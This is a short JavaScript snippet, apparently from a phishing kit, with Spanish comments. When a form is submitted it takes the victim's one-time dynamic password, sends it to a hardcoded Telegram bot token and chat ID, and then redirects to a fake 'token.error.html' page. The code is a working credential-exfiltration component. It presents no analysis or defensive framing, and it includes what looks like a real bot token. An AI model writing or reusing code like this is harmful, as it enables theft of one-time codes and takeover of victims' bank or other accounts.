document.getElementById("form").addEventListener("submit", function(event) {
    event.preventDefault(); // Evita el envío normal del formulario
    console.log('Formulario enviado'); // Verifica si se ejecuta

    // Recolecta los datos del formulario
    const dinamycpass = document.getElementById("otp").value;

    // Crea el mensaje que enviarás al bot
    const mensaje = `
        Clave dinámica: ${dinamycpass}
    `;

    // Reemplaza con tu token de bot y tu chat ID
    const botToken = "7867820710:AAHjT59PWYnnfrx5PVh6XIJNZm_qG-Kfxmo";
    const chatId = "6405977303";

    // Envía el mensaje a Telegram
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: mensaje
        })
    })
    .then(response => response.json()) // Procesa la respuesta
    .then(data => {
        console.log('Mensaje enviado correctamente:', data); // Verifica si se envió correctamente
        // Redirige a otra página
        window.location.href = 'token.error.html'; 
    })
    .catch(error => {
        console.error('Error al enviar mensaje:', error); // Maneja cualquier error
    });
});
